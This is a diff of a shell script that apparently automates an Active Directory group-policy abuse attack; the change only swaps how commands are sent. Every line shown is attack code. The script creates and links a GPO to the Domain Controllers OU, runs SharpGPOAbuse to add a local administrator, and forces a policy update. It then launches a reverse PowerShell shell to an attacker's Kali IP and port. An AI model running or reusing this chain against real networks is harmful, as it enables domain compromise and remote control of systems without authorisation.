@@ -32,21 +32,21 @@ DC=${form_data["dc"]}
 
 GPO_NAME="doesnotmatter"
 
-paste_command "New-GPO -Name \"${GPO_NAME}\""
-xdotool key Return
+execute_command "New-GPO -Name \"${GPO_NAME}\""
+create_new_line
 sleep 1
 
-paste_command "New-GPLink -Name \"${GPO_NAME}\" -Target \"OU=Domain Controllers,DC=${DC}\""
-xdotool key Return
+execute_command "New-GPLink -Name \"${GPO_NAME}\" -Target \"OU=Domain Controllers,DC=${DC}\""
+create_new_line
 sleep 1
 
-paste_command "${SHARP_GPO_ABUSE_FILE_LOCATION} --AddLocalAdmin --UserAccount ${USERNAME} --GPOName ${GPO_NAME}"
-xdotool key Return
+execute_command "${SHARP_GPO_ABUSE_FILE_LOCATION} --AddLocalAdmin --UserAccount ${USERNAME} --GPOName ${GPO_NAME}"
+create_new_line
 sleep 3
 
-paste_command "gpupdate /force"
-xdotool key Return
+execute_command "gpupdate /force"
+create_new_line
 sleep 2
 
-paste_command "${RUN_AS_FILE_LOCATION} "${USERNAME}" '${PASSWORD}' powershell.exe -r ${KALI_IP}:${SHELL_PORT}"
-xdotool key Return
+execute_command "${RUN_AS_FILE_LOCATION} "${USERNAME}" '${PASSWORD}' powershell.exe -r ${KALI_IP}:${SHELL_PORT}"
+create_new_line
